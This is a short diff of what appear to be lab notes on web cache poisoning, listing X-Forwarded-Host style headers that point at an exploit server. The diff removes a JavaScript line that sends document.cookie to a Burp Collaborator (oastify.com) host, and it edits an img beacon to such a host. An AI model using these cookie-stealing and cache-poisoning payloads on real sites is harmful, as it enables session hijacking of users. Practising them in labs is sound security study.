@@ -75,13 +75,14 @@ X-Forwarded-Host: exploit-0a56003803b033f28209c8f101b900f2.exploit-server.net
 X-Host: exploit-0a56003803b033f28209c8f101b900f2.exploit-server.net  
 X-Forwarded-Server: exploit-0a56003803b033f28209c8f101b900f2.exploit-server.net
 
-document.location='http://7ksammb8rmagtt67ea2b6r05ewkm8b.oastify.com/?cookies='+document.cookie;
-
 Vary: User-Agent
 
 ```html
-<img src="http://7fnahm68mm5got179axb1rv59wfn3c.oastify.com/?agent" />
+<img src="http://7fnahm68mm5got179axb1rv59wfn3c.oastify.com/" />
 ```
 
+User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+![[Pasted image 20240809114403.png]]
 
 
